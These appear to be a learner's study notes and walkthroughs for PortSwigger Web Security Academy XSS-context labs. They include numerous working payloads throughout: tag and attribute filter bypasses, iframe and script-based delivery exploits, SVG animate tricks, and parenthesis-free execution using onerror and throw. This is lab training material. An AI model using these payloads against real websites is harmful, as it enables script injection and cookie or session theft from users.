Always check Porswigger xss cheat shhet for Xss bypass https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

# Cross Site scripting Context

- When testing for reflected and stored XSS, a key task is to identify the XSS context:
- The location within the response where attacker-controllable data appears.
- Any input validation or other processing that is being performed on that data by the application.
- Based on these details, you can then select one or more candidate XSS payloads, and test whether they are effective.

# XSS between HTML tags
- When the XSS context is text between HTML tags, you need to introduce some new HTML tags designed to trigger execution of JavaScript.
- Some useful ways of executing JavaScript are:
```
<script>alert(document.domain)</script>
<img src=1 onerror=alert(1)>
```

# LAB 1: Reflected XSS into HTML context with nothing encoded
# Steps taken to solve the labs
- Test every entry point.
- Found a reflected one on Search
- Found three in Comments section good for stored XSS but the lab is for reflected xss so we go for the one on search
- The context is in Html tag "h1"
- Testing for a candidate payload ```<script>alert(1)</script>``` using burp repeater
- The candidate payload works and it is reflected on the burp suit repeater render
- Trying it out on the browser. It worked and the lab is solved

# LAB 2: REFLECTED XSS INTO HTML CONTEXT WITH MOST TAGS AND ATTRIBUTES BLOCKED
- Test every entry point.
- Found a reflected one on Search
- Testing for a candidate payload ```<script>alert(1)</script>``` using burp repeater
- The candidate payload did not work, looking for another alternative payload
- Tried to encode but not going through
- The body tag is allowed going to ask chatgpt about body attributes
- Chatgpt gives me different attributes I can use examples are: onload, unonload
- Only onresize is working for now but the lab is not solved yet
# Solution
- This solution is tricky, And because I have no experience with Xss bugs, I could not get it.
- However chatgpt helped, I only needed to put everything into a frame and deliver it to a victim via the exploit
- Here is how the final exploit looked like
```code
<iframe
  src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E"
  onload=this.style.width='100px'>
</iframe>
```
# Solution from Portswiger
- Inject a standard XSS vector, such as:```<img src=1 onerror=print()>```
- Observe that this gets blocked. In the next few steps, we'll use use Burp Intruder to test which tags and attributes are being blocked.
- Open Burp's browser and use the search function in the lab. Send the resulting request to Burp Intruder, we can also use turbo intruder.
- In Burp Intruder, replace the value of the search term with: <>
- Place the cursor between the angle brackets and click Add § to create a payload position. 
- The value of the search term should now look like: <§§>
- Visit the XSS cheat sheet and click Copy tags to clipboard.
- In the Payloads side panel, under Payload configuration, click Paste to paste the list of tags into the payloads list. 
- Click  Start attack.
- When the attack is finished, review the results. Note that most payloads caused a 400 response, but the body payload caused a 200 response.
- Go back to Burp Intruder and replace your search term with:
```<body%20=1>```
- Place the cursor before the = character and click Add § to create a payload position. 
- The value of the search term should now look like: ```<body%20§§=1>```
- Visit the XSS cheat sheet and click Copy events to clipboard.
- In the Payloads side panel, under Payload configuration, click Clear to remove the previous payloads. - Then click Paste to paste the list of attributes into the payloads list. 
- Click  Start attack.
- When the attack is finished, review the results. 
- Note that most payloads caused a 400 response, but the onresize payload caused a 200 response.
- Go to the exploit server and paste the following code, replacing YOUR-LAB-ID with your lab ID:
```
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
```
- Click Store and Deliver exploit to victim.

# LAB 3: REFLECTED XSS INTO HTML CONTEXT WITH All TAGS EXCEPT CUSTOM TAGS BLOCKED
- Followed the steps of Identifying an entry point, Got one
- All tags are blocked except custom tags, tried ```<xss>``` and Xss was fired.
- Trying to deliver like the previous one but the Iframe refused to connect 
- I got the xss to fire:
```<xss onfocus=alert(document.cookie) autofocus></xss>```
- But I did not know how to deliver the payload
- Final payload that worked, I embeded the full link to the xss inside the location function inside the script tag
```
<script>
location='https://0a62006b0338f43b81457a6a005100ed.web-security-academy.net/?search=%3Cxss+onfocus%3Dalert%28document.cookie%29+autofocus+tabindex%3D1%3E%'
</script>
```
# What I learnt from Lab 2 and 3
- You can deliver an Xss payload with Iframe or Script tag
- If Iframe are blocked with same origin policies, we can use script tag.
- Watching the solution, I got to see that autofocus was not used at all.
- tabindex=1 was used and #X was also used to make the page autofocus in the Id of X
- So the payload will look like this
```
<script>
location='https://0a62006b0338f43b81457a6a005100ed.web-security-academy.net/?search=%3Cxss+onfocus%3Dalert%28document.cookie%29+id%3D%27X%27+tabindex%3D1%3E%#X'
</script>
```
# LAB 4: Reflected Xss with event handlers and href attribute blocked (EXPERT LEVEL)
- First lets search for the whitlisted tags
- The following tags are whitelisted, a, animate image, title and svg
- All I am trying has not worked, I will continue to tomorrow, Insha aa Allah
- This is very crazy, To solve this we have to know whats available
- The animate tag contains attributeName attribute that can set the attribute of it's parent tag
- The payload goes like this:
```
<svg>
  <a>
    <animate attributeName=href values=javasript:alert(1) />
    <text x=20 y=20>Click Me</text>
  </a>
</svg>
```
- Now to going through the community solutions
- To learn more about svgs is the way to unlock tags XSS



# LAB 5: Reflected XSS with some svg markup allowed
- When solving this lab, I asked chatgpt to give over 200 svg tags
- I used the tags as payload to view successful ones
- I got animateTransform
- I asked it to give me all the event handlers of animateTransform and I got onbegin
- I asked it to fire alert with onbegin, and here is the final payload
```
<svg><rect><animateTransform+onbegin%3D"alert%28%27Animation+started%27%29"+%29"%2F><%2Frect><%2Fsvg>
```

# XSS in HTML tag attributes
- When the XSS context is into an HTML tag attribute value, you might sometimes be able to terminate the attribute value, close the tag, and introduce a new one. 
- For example:
```
"><script>alert(document.domain)</script>
```
- More commonly in this situation, angle brackets are blocked or encoded, so your input cannot break out of the tag in which it appears. 
- Provided you can terminate the attribute value, you can normally introduce a new attribute that creates a scriptable context, such as an event handler. 
- For example:
```
" autofocus onfocus=alert(document.domain) x="
```
- The above payload creates an onfocus event that will execute JavaScript when the element receives the focus, and also adds the autofocus attribute to try to trigger the onfocus event automatically without any user interaction. 
- Finally, it adds x=" to gracefully repair the following markup.

# LAB 6: Reflected XSS into attribute with angle brackets HTML-encoded
- The lab has a HINT
- Just because you're able to trigger the alert() yourself doesn't mean that this will work on the victim. 
- You may need to try injecting your proof-of-concept payload with a variety of different attributes before you find one that successfully executes in the victim's browser.
- Solving this lab was easy for me, that I don't even  realised have done it, anyways payload here
```
Hello"%20onfocus=alert(1)%20autofocus%20x="
```

- Sometimes the XSS context is into a type of HTML tag attribute that itself can create a scriptable context. 
- Here, you can execute JavaScript without needing to terminate the attribute value. 
- For example, if the XSS context is into the href attribute of an anchor tag, you can use the javascript pseudo-protocol to execute script. 
- For example:
```
<a href="javascript:alert(document.domain)">
```

- You might encounter websites that encode angle brackets but still allow you to inject attributes.
- Sometimes, these injections are possible even within tags that don't usually fire events automatically, such as a canonical tag. 
- You can exploit this behavior using access keys and user interaction on Chrome. 
- Access keys allow you to provide keyboard shortcuts that reference a specific element. 
- The accesskey attribute allows you to define a letter that, when pressed in combination with other keys (these vary across different platforms), will cause events to fire.
- The question is What are Access Key and cannonical tags?
```
<input type="hidden" name="redacted" value="default" injection="xss" />
```
- XSS in hidden inputs is frequently very difficult to exploit because typical JavaScript events like onmouseover and onfocus can't be triggered due to the element being invisible.
- We can execute an XSS payload inside a hidden attribute, provided you can persuade the victim into pressing the key combination.
- On Firefox Windows/Linux the key combination is ALT+SHIFT+X and on OS X it is CTRL+ALT+X. 
- You can specify a different key combination using a different key in the access key attribute. 
- Here is the vector:
```
<input type="hidden" accesskey="X" onclick="alert(1)">
```
- Please note if your reflection is repeated then the key combination will fail. 
- A workaround is to then inject another attribute that breaks the second reflection. e.g. " accesskey="x" onclick="alert(1)" x='

# Lab 7: Reflected XSS in canonical link tag
- This lab reflects user input in a canonical link tag and escapes angle brackets.
- To solve the lab, perform a cross-site scripting attack on the home page that injects an attribute that calls the alert function.
- To solve this lab
- I struggled in finding the injection point at first but on instepecting the home page I found a link with canonical rel so I constructed this payload
```
?hello'accesskey='x'onclick='alert(1)
```
- And the lab was solved.

# XSS into JavaScript
- When the XSS context is some existing JavaScript within the response, a wide variety of situations can arise, with different techniques necessary to perform a successful exploit.

# Terminating the existing script
- In the simplest case, it is possible to simply close the script tag that is enclosing the existing JavaScript, and introduce some new HTML tags that will trigger execution of JavaScript. 
-For example, if the XSS context is as follows:
```
<script>
...
var input = 'controllable data here';
...
</script>
```
- then you can use the following payload to break out of the existing JavaScript and execute your own:
```
</script><img src=1 onerror=alert(document.domain)>
```
- The reason this works is that the browser first performs HTML parsing to identify the page elements including blocks of script, and only later performs JavaScript parsing to understand and execute the embedded scripts. 
- The above payload leaves the original script broken, with an unterminated string literal. But that doesn't prevent the subsequent script being parsed and executed in the normal way.

# LAB 8: Reflected XSS into a JavaScript string with single quote and backslash escaped
- This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality. 
- The reflection occurs inside a JavaScript string with single quotes and backslashes escaped.
- To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the alert function.
- Solving this lab, I was overthinking it and did not follow the above instructions that the browser first performs HTML parsing before running javascript.
- So the solution is:
```
</script><script>alert(1)</script>
```
# Breaking out of a JavaScript string
- In cases where the XSS context is inside a quoted string literal, it is often possible to break out of the string and execute JavaScript directly. 
- It is essential to repair the script following the XSS context, because any syntax errors there will prevent the whole script from executing.
- Some useful ways of breaking out of a string literal are:
```
'-alert(document.domain)-'
';alert(document.domain)//
```

# Lab 9: Reflected XSS into a JavaScript string with angle brackets HTML encoded
- This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality where angle brackets are encoded. 
- The reflection occurs inside a JavaScript string. To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the alert function.
- This lab was not hard at all
- Solution
```
';alert(1)//
```

- Some applications attempt to prevent input from breaking out of the JavaScript string by escaping any single quote characters with a backslash. 
- A backslash before a character tells the JavaScript parser that the character should be interpreted literally, and not as a special character such as a string terminator. 
- In this situation, applications often make the mistake of failing to escape the backslash character itself. 
- This means that an attacker can use their own backslash character to neutralize the backslash that is added by the application.
- For example, suppose that the input:
```
';alert(document.domain)//
```
- gets converted to:
```
\';alert(document.domain)//
```
You can now use the alternative payload:
```
\';alert(document.domain)//
```
which gets converted to:
```
\\';alert(document.domain)//
```
- Here, the first backslash means that the second backslash is interpreted literally, and not as a special character. 
- This means that the quote is now interpreted as a string terminator, and so the attack succeeds.

# Lab 10: Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped
- This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality where angle brackets and double are HTML encoded and single quotes are escaped.
- To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the alert function.
- This lab was not that add and not far from the previous one
- Solution
```
\';alert(1)//
``` 

- Some websites make XSS more difficult by restricting which characters you are allowed to use. 
- This can be on the website level or by deploying a WAF that prevents your requests from ever reaching the website. 
- In these situations, you need to experiment with other ways of calling functions which bypass these security measures. 
- One way of doing this is to use the throw statement with an exception handler. 
- This enables you to pass arguments to a function without using parentheses. 
- The following code assigns the alert() function to the global exception handler and the throw statement passes the 1 to the exception handler (in this case alert). 
- The end result is that the alert() function is called with 1 as an argument.
```
onerror=alert;throw 1
```
- There are multiple ways of using this technique to call functions without parentheses.

# Call functions without parenthesis
- https://thespanner.co.uk/hacking-rooms
- https://portswigger.net/research/xss-without-parentheses-and-semi-colons
- From the above Articles I got the following:
- I encountered a site that was filtering parentheses and semi-colons, and I thought it must be possible to adapt this technique to execute a function without a semi-colon. 
- The first way is pretty straightforward: you can use curly braces to form a block statement in which you have your onerror assignment. 
- After the block statement you can use throw without a semi-colon (or new line):
```
<script>{onerror=alert}throw 1337</script>
<script>throw onerror=alert,'some string',123,'haha'</script>
```
- If you've tried running the code you'll notice that Chrome prefixes the string sent to the exception handler with "Uncaught".
- In my previous blog post I showed how it was possible to use eval as the exception handler and evaluate strings. 
- To recap you can prefix your string with an = which then makes the 'Uncaught' string a variable and executes arbitrary JavaScript. For example:
```
<script>{onerror=eval}throw'=alert\x281337\x29'</script>
<script>{onerror=eval}throw{lineNumber:1,columnNumber:1,fileName:1,message:'alert\x281\x29'}</script>
```
- You can use the fileName property to send a second argument on Firefox too:
```
<script>{onerror=prompt}throw{lineNumber:1,columnNumber:1,fileName:'second argument',message:'first argument'}</script>
```
- After I posted this stuff on Twitter @terjanq and @cgvwzq (Pepe Vila) followed up with some cool vectors. Here @terjanq removes all string literals:
```
<script>throw/a/,Uncaught=1,g=alert,a=URL+0,onerror=eval,/1/g+a[12]+[1337]+a[13]</script>
```
Pepe removed the need of the throw statement completely by using type errors to send a string to the exception handler. 
```
<script>TypeError.prototype.name ='=/',0[onerror=eval]['/-alert(1)//']</script>
```
# Lab 11: Reflected XSS in a JavaScript URL with some characters blocked EXpert level
- This lab reflects your input in a JavaScript URL, but all is not as it seems. 
- This initially seems like a trivial challenge; however, the application is blocking some characters in an attempt to prevent XSS attacks.
- To solve the lab, perform a cross-site scripting attack that calls the alert function with the string 1337 contained somewhere in the alert message.
- Personally for me this lab is extremely difficult, Even though I don't wanna copy solution 
- I ended watching a 24 minutes video solution before solving it
- Link to the video: https://www.youtube.com/watch?v=bCpBD--GCtQ
- In the video, I learnt so much about javascript parameters and arguments, You can watch it too.
- Anothing I learnt is that, always check for everywhere for user input'
- The Input could be Url parameters too
- Final payload
```
post?postId=5&%27},x=x=>{throw/**/onerror=alert,1337},toString=x,window+%27%27,{x:%27
```
- As you can see The payload starts after the postId parameter

# Making use of HTML-encoding
- When the XSS context is some existing JavaScript within a quoted tag attribute, such as an event handler, it is possible to make use of HTML-encoding to work around some input filters.
- When the browser has parsed out the HTML tags and attributes within a response, it will perform HTML-decoding of tag attribute values before they are processed any further. 
- If the server-side application blocks or sanitizes certain characters that are needed for a successful XSS exploit, you can often bypass the input validation by HTML-encoding those characters.
- For example, if the XSS context is as follows:
```
<a href="#" onclick="... var input='controllable data here'; ...">
```
- and the application blocks or escapes single quote characters, you can use the following payload to break out of the JavaScript string and execute your own script:
```
&apos;-alert(document.domain)-&apos;
```
- The ```&apos;``` sequence is an HTML entity representing an apostrophe or single quote. 
- Because the browser HTML-decodes the value of the onclick attribute before the JavaScript is interpreted, the entities are decoded as quotes, which become string delimiters, and so the attack succeeds.

# XSS in JavaScript template literals
- JavaScript template literals are string literals that allow embedded JavaScript expressions. 
- The embedded expressions are evaluated and are normally concatenated into the surrounding text. 
- Template literals are encapsulated in backticks instead of normal quotation marks, and embedded expressions are identified using the ${...} syntax.
- For example, the following script will print a welcome message that includes the user's display name:
```
document.getElementById('message').innerText = `Welcome, ${user.displayName}.`;
```
- When the XSS context is into a JavaScript template literal, there is no need to terminate the literal. 
- Instead, you simply need to use the ${...} syntax to embed a JavaScript expression that will be executed when the literal is processed. For example, 
- if the XSS context is as follows:
```
<script>
...
var input = `controllable data here`;
...
</script>
```
then you can use the following payload to execute JavaScript without terminating the template literal:
```
${alert(document.domain)}
```

# Lab 12: Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped
- This lab contains a reflected cross-site scripting vulnerability in the search blog functionality. 
- The reflection occurs inside a template string with angle brackets, single, and double quotes HTML encoded, and backticks escaped. 
- To solve this lab, perform a cross-site scripting attack that calls the alert function inside the template string.
- Lab not hard, Coz the context is template literals, I love using template literals When I was learning javascript and REACT
- Final solution to this Lab
```
,${alert(1)}
```

# Lab: Stored XSS into anchor href attribute with double quotes HTML-encoded
- This lab contains a stored cross-site scripting vulnerability in the comment functionality. 
- To solve this lab, submit a comment that calls the alert function when the comment author name is clicked. 
- solution: ```javascript:alert(document.domain)

# Lab: Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped
- This lab contains a stored cross-site scripting vulnerability in the comment functionality.
- To solve this lab, submit a comment that calls the alert function when the comment author name is clicked.
- This lab was not that clear but I was able to solve the lab with this payload
```
&apos;-alert(document.domain)-&apos;
```
- Where ```&apos;``` stands for single quote.
- The explanation of this kind of bug is above. In making use of HTML encoding
- Why does HTML encoding works in this situation?
- It works because the overall context was inside HTML event handler, the javascript context was inside the HTML a tag.
- Confusing right?, LEts go solve some more labs.
- All XssContext Labs have been completed
